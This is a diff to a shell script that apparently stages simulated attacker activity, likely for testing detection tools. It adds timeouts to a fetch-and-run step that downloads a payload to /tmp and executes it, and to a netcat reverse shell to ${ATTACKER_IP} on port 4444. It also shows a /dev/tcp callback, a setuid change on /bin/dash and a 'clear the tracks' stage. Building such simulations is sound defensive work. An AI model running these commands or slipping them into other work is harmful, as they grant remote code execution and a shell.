@@ -22,7 +22,7 @@ echo "[*] Simulated attacker endpoint: ${ATTACKER_IP}"
 #          Suspicious Directory
 # ----------------------------------------------------------------------------
 echo "[1/7] Download + execute payload in /tmp"
-curl -s -o /tmp/demo-x.sh "${PAYLOAD_URL}" || wget -q -O /tmp/demo-x.sh "${PAYLOAD_URL}" || true
+curl -s -m 10 -o /tmp/demo-x.sh "${PAYLOAD_URL}" || wget -q -T 10 -O /tmp/demo-x.sh "${PAYLOAD_URL}" || echo "(attacker unreachable - simulated)"
 chmod +x /tmp/demo-x.sh 2>/dev/null || true
 /tmp/demo-x.sh 2>/dev/null || true
 
@@ -76,10 +76,7 @@ chmod u+s /bin/dash 2>/dev/null || true
 # ----------------------------------------------------------------------------
 echo "[6/7] Open reverse shell (fires, then closes)"
 timeout 3 bash -c "echo > /dev/tcp/${ATTACKER_IP}/4444" 2>/dev/null || true
-nc -e /bin/sh "${ATTACKER_IP}" 4444 2>/dev/null &
-NC_PID=$!
-sleep 2
-kill "${NC_PID}" 2>/dev/null || true
+timeout 5 nc -e /bin/sh "${ATTACKER_IP}" 4444 2>/dev/null || true
 
 # ----------------------------------------------------------------------------
 # Stage 7 — clear the tracks
